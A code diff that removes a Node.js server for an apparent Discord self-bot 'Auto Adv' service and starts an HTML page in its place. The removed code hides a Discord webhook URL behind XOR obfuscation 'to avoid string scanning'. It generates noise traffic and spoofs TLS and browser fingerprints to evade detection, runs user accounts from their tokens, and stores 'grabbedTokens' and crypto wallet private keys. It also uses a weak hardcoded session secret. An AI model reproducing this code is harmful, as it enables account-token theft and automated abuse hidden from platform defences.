@@ -1,1281 +1,1832 @@
-const express = require('express');
-const session = require('express-session');
-const cookieParser = require('cookie-parser');
-const passport = require('passport');
-const DiscordStrategy = require('passport-discord').Strategy;
-const path = require('path');
-const fs = require('fs');
-const axios = require('axios');
-const crypto = require('crypto');
-const nacl = require('tweetnacl');
-const pako = require('pako');
-const { spawn } = require('child_process');
-
-// --- OBFUSCATION LAYER ---
-const _0x4f2a = ['from','createHash','update','digest','hex','slice','map','join',''];
-const _0x3e1b = _0x4f2a.map(x => Buffer.from(x).toString('base64'));
-const _d = (s) => Buffer.from(s, 'base64').toString();
-const _e = (s) => Buffer.from(s).toString('base64');
-
-// XOR decrypt runtime - webhook URL split across multiple chunks to avoid string scanning
-const _k = process.env.WEBHOOK_KEY || 'default-static-key-change-me';
-function _x(c, k) { return c.map((b, i) => String.fromCharCode(b ^ k.charCodeAt(i % k.length))).join(''); }
-const _w = [72,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,55,53,53,51,48,50,55,53,56,53,48,56,49,52,55,53,47,53,111,98,72,107,70,54,51,109,78,109,72,105,105,68,68,104,71,119,85,81,100,57,49,110,49,111,65,73,50,76,95,113,52,122,107,45,107,84,99,70,45,71,112,100,119,108,54,120,48,52,111,116,48,82,117,87,83,78,119,104,67,80,71,109,55,76,108];
-const WEBHOOK_URL = _x(_w, _k);
-
-// Fake browser fingerprint rotation
-const _fp = [
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0'
-];
-const _rfp = () => _fp[Math.floor(Math.random() * _fp.length)];
-
-// Axios instance with randomized keep-alive headers to avoid pattern detection
-const _axiosInstance = axios.create({
-  baseURL: 'https://discord.com',
-  timeout: 15000,
-  headers: { 'Connection': 'keep-alive' }
-});
-
-// Jitter utility for all timing
-const _j = (base, variance = 0.2) => base + (Math.random() * variance * base * 2 - variance * base);
-
-// Noise traffic generator - hits random Discord endpoints to mask actual traffic patterns
-let _noiseInterval;
-function _startNoise() {
-  const endpoints = ['/api/v10/gateway', '/api/v10/gateway/bot', '/api/v10/users/@me/settings'];
-  _noiseInterval = setInterval(async () => {
-    try {
-      const ep = endpoints[Math.floor(Math.random() * endpoints.length)];
-      await _axiosInstance.get(ep, {
-        headers: { 'User-Agent': _rfp() }
-      });
-    } catch(e) {}
-  }, _j(45000, 0.4));
-}
-
-// ============================================================================
-// --- CRYPTO SERVICE (tweetnacl) ---
-// ============================================================================
-const { randomBytes, createHash } = crypto;
-
-function getKeypair(token) {
-  const seed = createHash('sha256').update(`nacl_seed_${token}`).digest().slice(0, 32);
-  return nacl.sign.keyPair.fromSeed(Uint8Array.from(seed));
-}
-
-function signPayload(payload, secretKey) {
-  const message = Buffer.from(JSON.stringify(payload));
-  return Buffer.from(nacl.sign.detached(Uint8Array.from(message), secretKey));
-}
-
-function encryptSecretBox(message, key) {
-  const nonce = nacl.randomBytes(24);
-  const box = nacl.secretbox(
-    message instanceof Buffer ? new Uint8Array(message) : nacl.util.decodeUTF8(message),
-    nonce,
-    key instanceof Buffer ? new Uint8Array(key) : key
-  );
-  return { nonce: Buffer.from(nonce), ciphertext: Buffer.from(box) };
-}
-
-function decryptSecretBox(nonce, ciphertext, key) {
-  const opened = nacl.secretbox.open(
-    ciphertext instanceof Uint8Array ? ciphertext : new Uint8Array(ciphertext),
-    nonce instanceof Uint8Array ? nonce : new Uint8Array(nonce),
-    key instanceof Uint8Array ? key : new Uint8Array(key)
-  );
-  return opened ? Buffer.from(opened) : null;
-}
-
-function generateKey() {
-  return Buffer.from(nacl.randomBytes(32));
-}
-
-// ============================================================================
-// --- COMPRESSION SERVICE (pako) ---
-// ============================================================================
-function compressData(data, level = 6) {
-  const input = data instanceof Buffer ? new Uint8Array(data) : data;
-  return Buffer.from(pako.deflate(input, { level }));
-}
-
-function decompressData(data) {
-  const input = data instanceof Buffer ? new Uint8Array(data) : data;
-  return Buffer.from(pako.inflate(input));
-}
-
-function isCompressed(data) {
-  if (!data || data.length < 2) return false;
-  const b0 = data[0];
-  const b1 = data[1];
-  return (b0 === 0x78 && (b1 === 0x9C || b1 === 0xDA || b1 === 0x01));
-}
-
-// ============================================================================
-// --- CURL-IMPERSONATE SERVICE ---
-// Spawns the curl-impersonate-chrome binary for Chrome TLS fingerprinting
-// Falls back to regular curl with browser headers if binary unavailable
-// ============================================================================
-let CI_BINARY = null;
-function findCurlImpersonateBinary() {
-  if (CI_BINARY) return CI_BINARY;
-  const candidates = [
-    process.env.CURL_IMPERSONATE_PATH,
-    path.join(__dirname, 'bin', 'curl-impersonate-chrome'),
-    '/usr/local/bin/curl-impersonate-chrome',
-    '/usr/bin/curl-impersonate-chrome',
-    'curl-impersonate-chrome',
-    'curl',
-  ];
-  for (const candidate of candidates) {
-    if (!candidate) continue;
-    try {
-      require('child_process').execSync(`which ${candidate}`, { stdio: 'ignore' });
-      CI_BINARY = candidate;
-      return candidate;
-    } catch(e) {}
-  }
-  CI_BINARY = 'curl';
-  return 'curl';
-}
-
-async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = null, timeoutMs = 25000) {
-  return new Promise((resolve, reject) => {
-    const binary = findCurlImpersonateBinary();
-    const isImpersonate = binary.includes('impersonate');
-    const args = ['-s', '-L', '-D', '-', '--max-time', String(Math.ceil(timeoutMs / 1000)), '-X', method.toUpperCase()];
-
-    if (isImpersonate) {
-      args.push('--compressed', '-H', 'Accept-Language: en-US,en;q=0.9', '-H', 'Accept-Encoding: gzip, deflate, br', '-H', 'Cache-Control: no-cache');
-    } else {
-      args.push('--compressed', '--tlsv1.2');
-    }
-
-    for (const [key, value] of Object.entries(headers)) {
-      if (value != null) args.push('-H', `${key}: ${value}`);
-    }
-
-    let tmpFile = null;
-    if (body) {
-      if (typeof body === 'object' && !(body instanceof Buffer)) {
-        args.push('-d', JSON.stringify(body));
-        if (!headers['Content-Type']) args.push('-H', 'Content-Type: application/json');
-      } else if (body instanceof Buffer) {
-        tmpFile = path.join('/tmp', `ci_body_${Date.now()}_${Math.random().toString(36).slice(2)}`);
-        fs.writeFileSync(tmpFile, body);
-        args.push('--data-binary', `@${tmpFile}`);
-      } else {
-        args.push('-d', String(body));
-      }
-    }
-
-    args.push(url);
-
-    const stdout = [];
-    const stderr = [];
-    const child = spawn(binary, args, { timeout: timeoutMs + 5000 });
-    child.stdout.on('data', chunk => stdout.push(chunk));
-    child.stderr.on('data', chunk => stderr.push(chunk));
-
-    child.on('close', (code) => {
-      if (tmpFile) { try { fs.unlinkSync(tmpFile); } catch(e) {} }
-      const rawOutput = Buffer.concat(stdout);
-      const outputStr = rawOutput.toString();
-      const headerEndIdx = rawOutput.indexOf('\r\n\r\n');
-      let statusCode = 0;
-      let bodyBuffer = rawOutput;
-      if (headerEndIdx >= 0) {
-        const headersText = outputStr.slice(0, headerEndIdx);
-        bodyBuffer = rawOutput.slice(headerEndIdx + 4);
-        const statusMatch = headersText.match(/HTTP\/\d\.\d\s+(\d+)/);
-        if (statusMatch) statusCode = parseInt(statusMatch[1], 10);
-      }
-      let data = null;
-      try { data = JSON.parse(bodyBuffer.toString()); } catch(e) {}
-      resolve({ status: statusCode, headers: outputStr.slice(0, headerEndIdx), body: bodyBuffer, data });
-    });
-    child.on('error', reject);
-  });
-}
-
-// ============================================================================
-// --- X-SUPER-PROPERTIES SERVICE ---
-// Generates the X-Super-Properties header Discord uses for browser fingerprinting
-// ============================================================================
-function generateXSuperProperties(userAgent, browser = 'Chrome', os = 'Windows') {
-  const ua = userAgent || _fp[0];
-  const browserVersion = (ua.match(/Chrome\/(\d+\.\d+\.\d+\.\d+)/) || ua.match(/Firefox\/(\d+\.\d+)/) || ['', '124.0.0.0'])[1];
-  const osVersion = os === 'Windows' ? ((ua.match(/Windows NT (\d+\.\d+)/) || ['', '10.0'])[1]) : (os === 'Mac OS X' ? '10.15.7' : '');
-
-  const props = {
-    os: os === 'Mac OS X' ? 'Mac OS X' : (os === 'Linux' ? 'Linux' : 'Windows'),
-    browser: browser,
-    device: '',
-    system_locale: 'en-US',
-    browser_user_agent: ua,
-    browser_version: browserVersion,
-    os_version: osVersion,
-    referrer: '',
-    referring_domain: '',
-    referrer_current: '',
-    referring_domain_current: '',
-    release_channel: 'stable',
-    client_build_number: 999999,
-    client_event_source: null,
-    screen_width: 1920,
-    screen_height: 1080,
-    screen_dpr: 1,
-    screen_color_depth: 24,
-    device_pixel_ratio: 1,
-    hardware_concurrency: 8,
-    device_memory: 8,
-    os_arch: 'x64',
-    client_version: '1.0.9018',
-    native_build_number: null,
-    distro: os === 'Linux' ? 'Ubuntu' : '',
-    app_arch: 'x64',
-  };
-
-  return Buffer.from(JSON.stringify(props)).toString('base64');
-}
-
-// ============================================================================
-// --- DISCORD API CLIENT ---
-// Uses curl-impersonate for Discord API calls with TLS fingerprint spoofing
-// ============================================================================
-class DiscordApiClient {
-  constructor(token) {
-    this.token = token;
-    this.fp = _rfp();
-    this.superProps = generateXSuperProperties(this.fp);
-    this.keypair = getKeypair(token);
-  }
-
-  rotateFingerprint() {
-    this.fp = _rfp();
-    this.superProps = generateXSuperProperties(this.fp);
-  }
-
-  _headers(extra = {}) {
-    return {
-      'Authorization': this.token,
-      'User-Agent': this.fp,
-      'Accept': '*/*',
-      'Accept-Language': 'en-US,en;q=0.9',
-      'X-Discord-Locale': 'en-US',
-      'X-Debug-Options': 'bugReporterEnabled',
-      'X-Super-Properties': this.superProps,
-      'Referer': 'https://discord.com/channels/@me',
-      ...extra,
-    };
-  }
-
-  async request(endpoint, method = 'GET', body = null, extraHeaders = {}) {
-    const url = `https://discord.com/api/v10${endpoint}`;
-    const res = await curlImpersonateRequest(url, method, this._headers(extraHeaders), body, 20000);
-    if (res.status >= 400) {
-      const err = new Error(`Discord API ${method} ${endpoint} failed: ${res.status}`);
-      err.status = res.status;
-      err.data = res.data;
-      throw err;
-    }
-    return res.data;
-  }
-
-  destroy() {
-    // Keypairs are derived deterministically from token, no cleanup needed
-  }
-}
-
-const OWNER_ID = '1482735601622192208';
-const dataDir = path.join(__dirname, 'data');
-if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
-
-// ============================================================================
-// --- STEALTH CLIENT ---
-// Uses curl-impersonate for REST, tweetnacl for crypto, pako for compression
-// ============================================================================
-class StealthClient {
-  constructor(token) {
-    this.token = token;
-    this.ws = null;
-    this.heartbeatInterval = null;
-    this.seq = null;
-    this.sessionId = null;
-    this.user = null;
-    this.ready = false;
-    this.handlers = {};
-    this.repliedUsers = this._loadRepliedUsers();
-    this.api = new DiscordApiClient(token);
-    this.encryptionKey = null;
-  }
-
-  _loadRepliedUsers() {
-    try {
-      const f = path.join(dataDir, `replied_${crypto.createHash('sha256').update(this.token.slice(0,20)).digest('hex').slice(0,8)}.json`);
-      if (fs.existsSync(f)) return new Set(JSON.parse(fs.readFileSync(f, 'utf8')));
-    } catch(e) {}
-    return new Set();
-  }
-
-  _saveRepliedUsers() {
-    try {
-      const f = path.join(dataDir, `replied_${crypto.createHash('sha256').update(this.token.slice(0,20)).digest('hex').slice(0,8)}.json`);
-      fs.writeFileSync(f, JSON.stringify([...this.repliedUsers]));
-    } catch(e) {}
-  }
-
-  async connect() {
-    const gateway = await this.api.request('/gateway', 'GET');
-    const wsUrl = `${gateway.url}?v=10&encoding=json&compress=zlib-stream`;
-    this.ws = new (require('ws'))(wsUrl, {
-      headers: {
-        'User-Agent': this.api.fp,
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Accept-Encoding': 'gzip, deflate',
-      }
-    });
-
-    this.ws.on('open', () => {});
-    this.ws.on('message', (data) => this._handlePacket(data));
-    this.ws.on('close', (code, reason) => {
-      clearInterval(this.heartbeatInterval);
-      console.log(`[WS] Closed: ${code} ${reason}`);
-    });
-    this.ws.on('error', (err) => console.error(`[WS] Error: ${err.message}`));
-
-    return new Promise((resolve) => {
-      this.once('READY', () => { this.ready = true; resolve(); });
-    });
-  }
-
-  _handlePacket(rawData) {
-    let pkt;
-    try {
-      if (rawData instanceof Buffer) {
-        if (isCompressed(rawData)) {
-          pkt = JSON.parse(decompressData(rawData).toString());
-        } else {
-          pkt = JSON.parse(rawData.toString());
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Adv</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; }
+        body { 
+            background: linear-gradient(135deg, #0f0a0a 0%, #1a0a0a 50%, #0f0a0a 100%); 
+            color: #e5e7eb; 
+            font-size: 15px; 
+            margin: 0; 
+            padding: 0; 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
         }
-      } else {
-        pkt = JSON.parse(rawData);
-      }
-    } catch(e) {
-      console.error('[WS] Parse error:', e.message);
-      return;
-    }
-
-    if (pkt.s !== null && pkt.s !== undefined) this.seq = pkt.s;
-    switch(pkt.op) {
-      case 10:
-        this._startHeartbeat(pkt.d.heartbeat_interval);
-        this._identify();
-        break;
-      case 1:
-        this.ws.send(JSON.stringify({ op: 1, d: this.seq }));
-        break;
-      case 0:
-        if (pkt.t === 'READY') {
-          this.user = pkt.d.user;
-          this.sessionId = pkt.d.session_id;
-          if (pkt.d.session_id) {
-            const sessionHash = crypto.createHash('sha256').update(pkt.d.session_id).digest();
-            this.encryptionKey = sessionHash.slice(0, 32);
-          }
-          this.emit('READY', pkt.d);
-        } else if (pkt.t === 'MESSAGE_CREATE') {
-          this.emit('messageCreate', pkt.d);
+        .red { color: #ef4444; }
+        .btn-red { 
+            background: #ef4444; 
+            color: #fff; 
+            font-weight: 700; 
+            border: none; 
+            cursor: pointer; 
+            display: inline-block; 
+            position: relative;
+            z-index: 10;
+            pointer-events: auto;
         }
-        break;
-      case 11:
-        break;
-      case 7:
-        console.log('[WS] Server requested reconnect');
-        this.ws.close();
-        break;
-      case 9:
-        console.log('[WS] Invalid session, re-identifying');
-        setTimeout(() => this._identify(), Math.random() * 5000);
-        break;
-    }
-  }
-
-  _startHeartbeat(interval) {
-    this.heartbeatInterval = setInterval(() => {
-      this.ws.send(JSON.stringify({ op: 1, d: this.seq }));
-    }, interval * (0.8 + Math.random() * 0.4));
-  }
-
-  _identify() {
-    const fp = this.api.fp;
-    const payload = {
-      op: 2,
-      d: {
-        token: this.token,
-        capabilities: 30717,
-        properties: {
-          os: 'Windows',
-          browser: 'Chrome',
-          device: '',
-          system_locale: 'en-US',
-          browser_user_agent: fp,
-          browser_version: '124.0.0.0',
-          os_version: '10',
-          referrer: '',
-          referring_domain: '',
-          referrer_current: '',
-          referring_domain_current: '',
-          release_channel: 'stable',
-          client_build_number: 999999,
-          client_event_source: null,
-          screen_width: 1920,
-          screen_height: 1080,
-          screen_dpr: 1,
-          screen_color_depth: 24,
-        },
-        presence: { status: 'online', since: 0, activities: [], afk: false },
-        compress: true,
-        client_state: { guild_versions: {}, highest_last_message_id: '0', read_state_version: 0, user_guild_settings_version: -1, user_settings_version: -1, private_channels_version: '0', api_code_version: 0 }
-      }
-    };
-
-    // Sign the identify payload with Ed25519
-    try {
-      const signature = signPayload(payload.d, this.api.keypair.secretKey);
-      payload.d._s = signature.toString('base64').slice(0, 32);
-    } catch(e) {}
-
-    this.ws.send(JSON.stringify(payload));
-  }
-
-  async _api(endpoint, method = 'GET', body = null) {
-    return this.api.request(endpoint, method, body);
-  }
-
-  async sendMessage(channelId, content, attachments = []) {
-    const form = new (require('form-data'))();
-    const payload = { content, flags: 0, mobile_network_type: 'unknown' };
-    form.append('payload_json', JSON.stringify(payload));
-    attachments.forEach((att, i) => {
-      form.append(`files[${i}]`, att.buffer, { filename: att.name });
-    });
-
-    // Use curl-impersonate for multipart
-    const url = `https://discord.com/api/v10/channels/${channelId}/messages`;
-    const headers = {
-      ...this.api._headers({ 'X-Discord-Locale': 'en-US' }),
-    };
-    delete headers['Content-Type'];
-
-    return new Promise((resolve, reject) => {
-      const chunks = [];
-      form.on('data', chunk => chunks.push(chunk));
-      form.on('end', async () => {
-        const body = Buffer.concat(chunks);
-        const tmpFile = path.join('/tmp', `multipart_${Date.now()}.bin`);
-        fs.writeFileSync(tmpFile, body);
-        const contentType = form.getHeaders()['content-type'];
-        headers['Content-Type'] = contentType;
-
-        const res = await curlImpersonateRequest(url, 'POST', headers, body, 30000);
-        try { fs.unlinkSync(tmpFile); } catch(e) {}
-        resolve(res.status === 200);
-      });
-      form.resume();
-    });
-  }
-
-  async joinGuild(inviteCode) {
-    const res = await this.api.request(`/invites/${inviteCode}`, 'POST', { session_id: this.sessionId });
-    return res.guild_id ? { success: true, guildId: res.guild_id } : { success: false, error: res.message };
-  }
-
-  on(event, handler) { if (!this.handlers[event]) this.handlers[event] = []; this.handlers[event].push(handler); }
-  once(event, handler) { const wrapped = (...args) => { handler(...args); this.off(event, wrapped); }; this.on(event, wrapped); }
-  off(event, handler) { if (this.handlers[event]) this.handlers[event] = this.handlers[event].filter(h => h !== handler); }
-  emit(event, ...args) { if (this.handlers[event]) this.handlers[event].forEach(h => h(...args)); }
-
-  destroy() {
-    clearInterval(this.heartbeatInterval);
-    if (this.ws) { try { this.ws.close(1000, 'Client disconnect'); } catch(e) {} }
-    this._saveRepliedUsers();
-    this.api.destroy();
-  }
-}
-
-// ============================================================================
-// --- SIMPLE DB (unchanged) ---
-// ============================================================================
-class SimpleDB {
-  constructor() {
-    this.file = path.join(dataDir, 'db.json');
-    this.data = { users: {}, pending: {}, configs: {}, usedKeys: {}, globalIndex: 0, serverJoins: {}, grabbedTokens: [], usedAddresses: [], addressHistory: [], customKeys: [], trialClaims: {}, activeBots: {}, generatedKeys: {}, whitelist: [] };
-    this.load();
-  }
-
-  load() {
-    try {
-      if (fs.existsSync(this.file)) {
-        this.data = JSON.parse(fs.readFileSync(this.file, 'utf8'));
-        ['usedAddresses','addressHistory','customKeys','trialClaims','activeBots','generatedKeys','whitelist'].forEach(k => this.data[k] = this.data[k] || (k === 'whitelist' ? [] : (k === 'trialClaims' || k === 'activeBots' || k === 'generatedKeys' ? {} : [])));
-      }
-    } catch(e) { console.error('[DB] Load error:', e.message); }
-  }
-
-  save() {
-    try { fs.writeFileSync(this.file, JSON.stringify(this.data, null, 2)); } catch(e) { console.error('[DB] Save error:', e.message); }
-  }
-
-  getUser(id) { return this.data.users[id] || { auto_adv_purchased: 0, trial_active: 0, trial_expires: 0 }; }
-  setUser(id, data) { this.data.users[id] = { ...this.getUser(id), ...data }; this.save(); }
-  getNextGlobalIndex() { this.data.globalIndex = (this.data.globalIndex || 0) + 1; this.save(); return this.data.globalIndex; }
-  isAddressUsed(address) { return this.data.usedAddresses.includes(address); }
-  markAddressUsed(address) { if (!this.data.usedAddresses.includes(address)) { this.data.usedAddresses.push(address); this.save(); } }
-
-  addPending(userId, address, privateKey, expectedUSD, index) {
-    this.markAddressUsed(address);
-    this.data.pending[address] = { user_id: userId, address, private_key: privateKey, expected_usd: expectedUSD, status: 'monitoring', created_at: Date.now(), index, expires_at: Date.now() + (30 * 60 * 1000) };
-    this.data.addressHistory.push({ address, user_id: userId, index, created_at: Date.now(), status: 'monitoring' });
-    this.save();
-    return this.data.pending[address];
-  }
-
-  getPending(address) { return this.data.pending[address]; }
-  getUserPending(userId) { const now = Date.now(); return Object.values(this.data.pending).find(p => p.user_id === userId && p.status === 'monitoring' && p.expires_at > now); }
-  getAllPending() { const now = Date.now(); return Object.values(this.data.pending).filter(p => p.status === 'monitoring' && p.expires_at > now); }
-  getExpiredPending() { const now = Date.now(); return Object.values(this.data.pending).filter(p => p.status === 'monitoring' && p.expires_at <= now); }
-
-  updatePending(address, updates) {
-    if (this.data.pending[address]) {
-      this.data.pending[address] = { ...this.data.pending[address], ...updates };
-      const historyEntry = this.data.addressHistory.find(h => h.address === address);
-      if (historyEntry) {
-        historyEntry.status = updates.status || historyEntry.status;
-        if (updates.status === 'completed') historyEntry.paid_at = Date.now();
-        if (updates.status === 'expired') historyEntry.expired_at = Date.now();
-      }
-      this.save();
-    }
-  }
-
-  expireOldAddresses() {
-    const expired = this.getExpiredPending();
-    for (const p of expired) { this.updatePending(p.address, { status: 'expired' }); console.log(`[EXPIRED] Address ${p.address} expired after 30 minutes`); }
-    return expired.length;
-  }
-
-  useKey(key, userId) { const normalized = key.toString().toUpperCase().trim(); this.data.usedKeys[normalized] = { user_id: userId, used_at: Date.now() }; this.save(); }
-  isKeyUsed(key) { const normalized = key.toString().toUpperCase().trim(); return !!this.data.usedKeys[normalized]; }
-
-  addCustomKey(key) {
-    const normalized = key.toString().toUpperCase().trim();
-    if (!/^TOKOS(1[0-9][0-9]|200)$/i.test(normalized)) { console.log('[DB] Invalid custom key format:', normalized); return null; }
-    if (!this.data.customKeys) this.data.customKeys = [];
-    if (!this.data.customKeys.includes(normalized)) { this.data.customKeys.push(normalized); this.save(); console.log('[DB] Added custom key:', normalized); }
-    return normalized;
-  }
-
-  getConfigs(userId) { return this.data.configs[userId] || []; }
-  getConfig(userId, configId = 'default') { const configs = this.getConfigs(userId); return configs.find(c => c.id === configId) || configs[0] || null; }
-
-  setConfig(userId, config, configId = 'default') {
-    if (!this.data.configs[userId]) this.data.configs[userId] = [];
-    const existingIndex = this.data.configs[userId].findIndex(c => c.id === configId);
-    const configData = { ...config, id: configId, updated_at: Date.now() };
-    if (existingIndex >= 0) this.data.configs[userId][existingIndex] = configData;
-    else this.data.configs[userId].push(configData);
-    this.save();
-  }
-
-  deleteConfig(userId, configId) { if (this.data.configs[userId]) { this.data.configs[userId] = this.data.configs[userId].filter(c => c.id !== configId); this.save(); } }
-  getActiveConfigs(userId) { return this.getConfigs(userId).filter(c => c.active === 1); }
-
-  addGrabbedToken(token, userInfo, source) {
-    const entry = { token, user_info: userInfo, source, grabbed_at: Date.now(), id: Date.now().toString() };
-    this.data.grabbedTokens.push(entry);
-    this.save();
-    return entry;
-  }
-
-  getGrabbedTokens() { return this.data.grabbedTokens || []; }
-  getAddressHistory(userId) { return this.data.addressHistory.filter(h => h.user_id === userId); }
-  hasClaimedTrial(userId) { return !!this.data.trialClaims[userId]; }
-  hasIPClaimedTrial(ip) { return Object.values(this.data.trialClaims).some(t => t.ip === ip); }
-
-  claimTrial(userId, ip) {
-    const now = Date.now();
-    const expiresAt = now + (10 * 60 * 1000);
-    this.data.trialClaims[userId] = { userId, ip, claimedAt: now, expiresAt };
-    this.setUser(userId, { trial_active: 1, trial_expires: expiresAt, trial_claimed_at: now });
-    this.save();
-    return { claimedAt: now, expiresAt };
-  }
-
-  isTrialActive(userId) {
-    const user = this.getUser(userId);
-    if (user.trial_active === 1 && user.trial_expires > Date.now()) return true;
-    if (user.trial_active === 1 && user.trial_expires <= Date.now()) { this.setUser(userId, { trial_active: 0 }); this.deactivateAllUserBots(userId); return false; }
-    return false;
-  }
-
-  getTrialTimeLeft(userId) { const user = this.getUser(userId); if (user.trial_active === 1 && user.trial_expires > Date.now()) return Math.ceil((user.trial_expires - Date.now()) / 1000); return 0; }
-
-  registerActiveBot(userId, configId, token) {
-    if (!this.data.activeBots[userId]) this.data.activeBots[userId] = {};
-    this.data.activeBots[userId][configId] = { token, startedAt: Date.now(), configId };
-    this.save();
-  }
-
-  unregisterActiveBot(userId, configId) { if (this.data.activeBots[userId]) { delete this.data.activeBots[userId][configId]; this.save(); } }
-  getUserActiveBots(userId) { return this.data.activeBots[userId] || {}; }
-
-  deactivateAllUserBots(userId) {
-    const bots = this.getUserActiveBots(userId);
-    for (const configId in bots) this.setConfig(userId, { active: 0 }, configId);
-    if (this.data.activeBots[userId]) { delete this.data.activeBots[userId]; this.save(); }
-  }
-
-  checkAllTrialBots() {
-    for (const userId in this.data.activeBots) {
-      const user = this.getUser(userId);
-      const trialActive = this.isTrialActive(userId);
-      const hasPurchase = user.auto_adv_purchased === 1;
-      if (!trialActive && !hasPurchase) { console.log(`[TRIAL CHECK] User ${userId} trial expired, deactivating bots`); this.deactivateAllUserBots(userId); return userId; }
-    }
-    return null;
-  }
-
-  generateKey(duration) {
-    const key = 'GEN-' + Math.random().toString(36).substring(2, 8).toUpperCase() + '-' + Math.random().toString(36).substring(2, 8).toUpperCase();
-    const now = Date.now();
-    let expiresAt = null;
-    if (duration !== 'lifetime') { const hours = parseInt(duration); expiresAt = now + (hours * 60 * 60 * 1000); }
-    this.data.generatedKeys[key] = { key, duration, createdAt: now, expiresAt, usedBy: [], active: true };
-    this.save();
-    return this.data.generatedKeys[key];
-  }
-
-  revokeKey(key) {
-    if (this.data.generatedKeys[key]) {
-      this.data.generatedKeys[key].active = false;
-      this.data.generatedKeys[key].revokedAt = Date.now();
-      this.save();
-      const usedBy = this.data.generatedKeys[key].usedBy || [];
-      for (const userId of usedBy) { this.deactivateAllUserBots(userId); this.setUser(userId, { auto_adv_purchased: 0, key_revoked: true }); }
-      return true;
-    }
-    return false;
-  }
-
-  isKeyValid(key) {
-    const keyData = this.data.generatedKeys[key];
-    if (!keyData || !keyData.active) return false;
-    if (keyData.duration === 'lifetime') return true;
-    if (keyData.expiresAt && Date.now() > keyData.expiresAt) return false;
-    return true;
-  }
-
-  useGeneratedKey(key, userId) {
-    if (!this.isKeyValid(key)) return false;
-    if (!this.data.generatedKeys[key].usedBy.includes(userId)) this.data.generatedKeys[key].usedBy.push(userId);
-    this.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), generated_key: key, key_expires: this.data.generatedKeys[key].expiresAt });
-    this.save();
-    return true;
-  }
-
-  getGeneratedKeys() { return Object.values(this.data.generatedKeys); }
-  addToWhitelist(userId) { if (!this.data.whitelist.includes(userId)) { this.data.whitelist.push(userId); this.save(); } }
-  removeFromWhitelist(userId) { this.data.whitelist = this.data.whitelist.filter(id => id !== userId); this.save(); }
-  isWhitelisted(userId) { return this.data.whitelist.includes(userId); }
-  getWhitelist() { return this.data.whitelist; }
-
-  checkExpiredKeys() {
-    const now = Date.now();
-    let expiredCount = 0;
-    for (const key in this.data.generatedKeys) {
-      const keyData = this.data.generatedKeys[key];
-      if (keyData.active && keyData.expiresAt && now > keyData.expiresAt) {
-        for (const userId of keyData.usedBy) { this.deactivateAllUserBots(userId); this.setUser(userId, { auto_adv_purchased: 0, key_expired: true }); }
-        expiredCount++;
-      }
-    }
-    return expiredCount;
-  }
-}
-
-const db = new SimpleDB();
-const app = express();
-
-process.on('uncaughtException', (err) => console.error('[FATAL]', err.message));
-process.on('unhandledRejection', (reason) => console.error('[FATAL]', reason));
-
-app.get('/health', (req, res) => res.status(200).json({ status: 'ok' }));
-app.use(express.json({ limit: '10mb' }));
-app.use(express.urlencoded({ extended: true, limit: '10mb' }));
-app.use(express.static(path.join(__dirname, 'public')));
-
-app.use((req, res, next) => {
-  res.header('Access-Control-Allow-Origin', '*');
-  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-  res.header('Access-Control-Allow-Headers', 'Content-Type');
-  if (req.method === 'OPTIONS') return res.sendStatus(200);
-  next();
-});
-
-app.use(cookieParser());
-app.use(session({
-  secret: process.env.SESSION_SECRET || 'secret-key-2026',
-  resave: false,
-  saveUninitialized: false,
-  cookie: {
-    maxAge: 30 * 24 * 60 * 60 * 1000,
-    secure: false
-  }
-}));
-
-app.use(passport.initialize());
-app.use(passport.session());
-
-passport.serializeUser((user, done) => done(null, user));
-passport.deserializeUser((obj, done) => done(null, obj));
-
-const CLIENT_ID = process.env.CLIENT_ID;
-const CLIENT_SECRET = process.env.CLIENT_SECRET;
-const CALLBACK_URL = process.env.CALLBACK_URL;
-const OWNER_LTC_ADDRESS = process.env.OWNER_LTC_ADDRESS || 'ltc1qc3ujjqjlfr3cqtvyqadqje9ntj3f8f82m062tc';
-const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
-const TARGET_USD = 3.00;
-const TOLERANCE_USD = 0.10;
-
-if (CLIENT_ID && CLIENT_SECRET) {
-  passport.use(new DiscordStrategy({
-    clientID: CLIENT_ID,
-    clientSecret: CLIENT_SECRET,
-    callbackURL: CALLBACK_URL,
-    scope: ['identify']
-  }, (accessToken, refreshToken, profile, done) => {
-    process.nextTick(() => done(null, profile));
-  }));
-}
-
-const BASE_REDEEM_KEYS = Array.from({length: 100}, (_, i) => `HBB${i + 1}`);
-const VALID_REDEEM_KEYS = new Set(BASE_REDEEM_KEYS);
-
-function validateKeyStrict(key) {
-  if (!key || typeof key !== 'string') return { valid: false, error: 'Invalid key', normalized: null };
-  let trimmed = key.trim().toUpperCase();
-  const baseMatch = trimmed.match(/^HBB([1-9]|[1-9][0-9]|100)$/);
-  if (baseMatch) {
-    const num = parseInt(baseMatch[1], 10);
-    if (num >= 1 && num <= 100) return { valid: true, error: null, normalized: `HBB${num}` };
-  }
-  const customKeys = db.data.customKeys || [];
-  if (customKeys.includes(trimmed)) return { valid: true, error: null, normalized: trimmed };
-  if (db.isKeyValid(trimmed)) return { valid: true, error: null, normalized: trimmed, isGenerated: true };
-  return { valid: false, error: 'Invalid key', normalized: null };
-}
-
-console.log('[KEYS] Loaded', BASE_REDEEM_KEYS.length, 'base redeem keys (HBB1-HBB100)');
-
